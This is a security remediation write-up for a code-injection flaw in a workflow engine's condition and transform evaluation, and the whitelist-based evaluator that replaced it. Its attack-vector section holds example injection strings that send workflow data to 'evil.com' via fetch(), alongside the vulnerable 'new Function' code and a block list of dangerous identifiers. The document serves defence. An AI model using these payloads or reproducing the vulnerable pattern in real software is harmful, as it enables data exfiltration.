# L2-T3: Code Injection (RCE) Fix - Security Remediation

## Task Summary
**Task ID:** L2-T3
**Category:** Security - Critical
**Status:** COMPLETED
**Date:** 2026-01-12

---

## Vulnerability Details

### Original Issue
**Location:** `nexus/src/lib/workflow-engine.ts` (lines 363, 377)
**Severity:** CRITICAL
**Type:** Remote Code Execution (RCE) / Code Injection

The workflow engine was using JavaScript's `new Function()` constructor to evaluate user-provided workflow conditions and data transforms. This is functionally equivalent to `eval()` and allows arbitrary JavaScript code execution.

### Attack Vectors

1. **Condition Injection (Line 363)**
   ```javascript
   // VULNERABLE CODE
   const result = new Function('input', `return ${condition}`)(input)
   ```
   An attacker could set a workflow condition like:
   ```javascript
   "true; fetch('https://evil.com/steal?data=' + JSON.stringify(input))"
   ```

2. **Transform Injection (Line 377)**
   ```javascript
   // VULNERABLE CODE
   const result = new Function('input', transformCode)(input)
   ```
   An attacker could set transform code like:
   ```javascript
   "return (async () => { await fetch('https://evil.com', {method:'POST', body:JSON.stringify(input)}); return input; })()"
   ```

### Impact
- **Data Exfiltration:** Attackers could steal sensitive workflow data
- **Client-side XSS:** Arbitrary DOM manipulation on user browsers
- **Account Takeover:** Access to authentication tokens/cookies
- **Lateral Movement:** Use as pivot point for further attacks

---

## Solution Implemented

### Approach: Whitelist-Based Expression Evaluator

Created a new module `safe-expression-evaluator.ts` that provides:

1. **Custom Lexer/Parser** - Tokenizes and parses expressions safely
2. **Whitelist-Only Operations** - Only allows pre-approved operations
3. **Blocked Identifiers** - Prevents access to dangerous globals
4. **Method Whitelist** - Only safe string/array methods allowed
5. **Structured Transforms** - Replaces arbitrary code with declarative operations

### Files Modified

| File | Change |
|------|--------|
| `nexus/src/lib/safe-expression-evaluator.ts` | NEW - Safe expression evaluation module |
| `nexus/src/lib/workflow-engine.ts` | Modified - Use safe evaluator, block unsafe code |

### Safe Expression Evaluator Features

**Supported Operations:**
- Property access: `input.field`, `input.nested.field`, `input['field']`
- Comparisons: `===`, `==`, `!==`, `!=`, `<`, `<=`, `>`, `>=`
- Logical operators: `&&`, `||`, `!`
- Arithmetic: `+`, `-`, `*`, `/`, `%`
- Literals: strings, numbers, booleans, null
- Array access: `input[0]`, `input.items[1]`
- Whitelisted methods: `.length`, `.includes()`, `.startsWith()`, `.endsWith()`, etc.
- typeof operator
- Ternary operator: `condition ? a : b`

**Blocked (Security):**
- `eval`, `Function`, `constructor`, `prototype`, `__proto__`
- `window`, `document`, `global`, `process`, `require`, `import`
- Arbitrary function calls
- Template literals with expressions
- Assignment operators

### Transform Operations (New API)

Instead of arbitrary JavaScript, transforms now use declarative operations:

```typescript
interface TransformOperation {
  type: 'pick' | 'omit' | 'rename' | 'map_field' | 'filter' | 'default' | 'flatten' | 'merge' | 'expression'
  fields?: string[]
  renames?: Record<string, string>
  mappings?: Record<string, string>
  condition?: string
  defaults?: Record<string, any>
  expression?: string
}
```

**Examples:**
```typescript
// Pick specific fields
{ type: 'pick', fields: ['name', 'email'] }

// Rename fields
{ type: 'rename', renames: { 'old_name': 'new_name' } }

// Map/transform fields
{ type: 'map_field', mappings: { 'fullName': 'input.firstName + " " + input.lastName' } }

// Filter arrays
{ type: 'filter', condition: 'input.status === "active"' }
```

### Backward Compatibility

The fix includes a legacy migration path:
1. New `transformOperations` array is preferred
2. Simple legacy patterns are auto-converted (e.g., `return input`, `return input.field`)
3. Unsafe legacy code is blocked with a clear migration message

---

## Code Changes

### workflow-engine.ts - Condition Evaluation

```typescript
// BEFORE (VULNERABLE)
const result = new Function('input', `return ${condition}`)(input)

// AFTER (SAFE)
const result = evaluateCondition(condition, input)
```

### workflow-engine.ts - Data Transform

```typescript
// BEFORE (VULNERABLE)
const result = new Function('input', transformCode)(input)

// AFTER (SAFE)
if (node.config.transformOperations && node.config.transformOperations.length > 0) {
  return transformData(input, node.config.transformOperations)
}
// Legacy code is parsed and migrated or blocked if unsafe
const safeOperations = parseLegacyTransform(transformCode)
if (safeOperations !== null) {
  return transformData(input, safeOperations)
}
// Block unsafe patterns
throw new SafeExpressionError('...')
```

---

## Testing Verification

### TypeScript Compilation
```
npx tsc --noEmit --skipLibCheck
# Passes with no errors
```

### Security Test Cases

The safe evaluator blocks:
- `eval("alert(1)")` - Blocked identifier
- `constructor.constructor("return this")()` - Blocked identifier
- `input.__proto__` - Blocked property
- `fetch('http://evil.com')` - Blocked identifier
- `(function(){return this})()` - Function calls blocked

---

## Migration Guide for Existing Workflows

### Conditions
Most conditions work as-is if they only use:
- Simple comparisons: `input.value > 10`
- Property access: `input.user.active === true`
- Logical operations: `input.type === 'admin' && input.enabled`

### Transforms
Replace `transformCode` with `transformOperations`:

**Before:**
```javascript
config: {
  transformCode: "return { name: input.firstName + ' ' + input.lastName }"
}
```

**After:**
```javascript
config: {
  transformOperations: [
    {
      type: 'map_field',
      mappings: {
        name: "input.firstName + ' ' + input.lastName"
      }
    }
  ]
}
```

---

## Security Recommendations

1. **Audit Existing Workflows** - Review all saved workflows for complex transform code
2. **Monitor Logs** - Watch for `[SECURITY] Blocked` warnings in console
3. **User Education** - Update documentation on safe expression syntax
4. **Input Validation** - Add server-side validation for workflow definitions
5. **CSP Headers** - Implement Content-Security-Policy to prevent inline script execution

---

## Summary

| Metric | Before | After |
|--------|--------|-------|
| RCE Vulnerability | Yes | No |
| Arbitrary Code Execution | Possible | Blocked |
| Safe Expression Support | N/A | Full |
| Backward Compatibility | N/A | Partial (simple patterns) |
| TypeScript Types | Basic | Full with TransformOperation |

**The critical RCE vulnerability has been eliminated.** The new safe expression evaluator provides a secure foundation for workflow condition and transform evaluation while maintaining most existing functionality.
